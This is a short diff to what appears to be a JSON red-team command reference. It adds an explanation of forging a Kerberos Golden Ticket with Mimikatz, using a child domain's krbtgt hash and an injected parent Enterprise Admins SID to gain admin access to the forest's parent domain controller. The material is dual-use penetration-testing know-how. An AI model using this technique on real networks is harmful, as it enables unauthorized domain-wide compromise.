@@ -129,5 +129,6 @@
       "label": "Access the parent DC",
       "command": "dir \\\\<parent_dc>\\C$"
     }
-  ]
+  ],
+  "explain": "Forges a Golden Ticket with Mimikatz, adding a foreign SID for cross-domain abuse:\n  kerberos::golden         forge a TGT offline\n  /user:<user> /domain:<child_domain> /sid:<child_sid>   the impersonated user, the child domain and its SID\n  /krbtgt:<krbtgt_hash>    the child krbtgt hash that signs the ticket\n  /sids:<parent_EA_sid>    ExtraSids - inject the parent Enterprise Admins SID into SID History\n  /ptt                     inject into the session\nSID History is not filtered inside a forest, so the ticket is treated as EA on the parent DC (dir \\\\<parent_dc>\\C$)."
 }
